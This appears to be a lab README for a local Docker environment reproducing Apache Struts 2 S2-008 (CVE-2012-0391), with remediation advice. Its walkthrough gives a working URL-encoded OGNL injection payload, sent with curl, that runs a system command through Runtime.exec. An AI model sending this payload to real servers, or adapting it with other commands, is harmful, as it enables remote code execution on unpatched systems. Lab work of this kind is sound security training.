# Apache Struts 2 S2-008 Multi-Vector OGNL Command Execution (CVE-2012-0391)

## Overview

Apache Struts 2 versions 2.0.0 through 2.3.1.1 contain multiple vulnerability vectors in exception handling and CookieInterceptor. When devMode is enabled or malformed cookies are processed, user parameters are evaluated twice within OGNL value stacks, allowing command injection without valid authentication.

- **Service Access**: `http://localhost:8175/`
- **Default Credentials**: `Unauthenticated OGNL evaluation`
- **Docker Shortcut**: `./lab start struts2-s2008`
- **Container Name**: `cyberlab_04_struts2_s2008`
- **RAM Footprint**: ~250M

---

## Exploitation Walkthrough

### 1. Send Double OGNL Evaluation Request

```bash
curl -i 'http://localhost:8175/devmode.action?debug=command&expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@java.lang.Runtime@getRuntime%28%29.exec%28%22touch%20%2Ftmp%2Fpwned_s2008%22%29)'
```

### 2. Verify Execution

```bash
docker exec -it cyberlab_04_struts2_s2008 ls -la /tmp/pwned_s2008
```

---

## Defensive Remediation & Hardening

1. Upgrade Apache Struts to version 2.3.1.2 or higher.
2. Ensure struts.devMode is set to false in production deployments.

---

## Video Walkthroughs & Technical References

- [The 'Ancient' Bug That Still Owns Modern Servers: CGI RCE Explained](https://www.youtube.com/watch?v=ncJOuqoMgFM)
- [Apache Struts S2-008 Advisory](https://cwiki.apache.org/confluence/display/WW/S2-008)
- [Vulhub Struts2 S2-008 Environment](https://vulhub.org/#/environments/struts2/s2-008/)
